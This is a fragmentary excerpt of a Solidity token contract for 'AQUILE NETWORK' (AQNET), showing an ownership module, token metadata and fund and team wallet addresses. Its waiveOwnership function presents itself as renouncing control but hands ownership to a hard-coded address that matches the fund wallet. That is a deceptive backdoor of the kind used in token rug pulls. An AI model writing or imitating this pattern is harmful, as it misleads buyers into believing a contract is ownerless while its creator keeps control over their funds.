...
/**
Telegram : https://t.me/aquilenetwork
Website : 
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x9D486aA936C40E3D033028E29B97Fa0372515099);
    }
...
contract AQUILENETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AQUILE NETWORK";
    string private _symbol = "AQNET";
    uint8 private _decimals = 9;

    address payable public fundWalletAddress = payable(0x9D486aA936C40E3D033028E29B97Fa0372515099);
    address payable public teamWalletAddress = payable(0x781719e5Dc1C1376eD1223652fcF8bbE18c3DDa0);
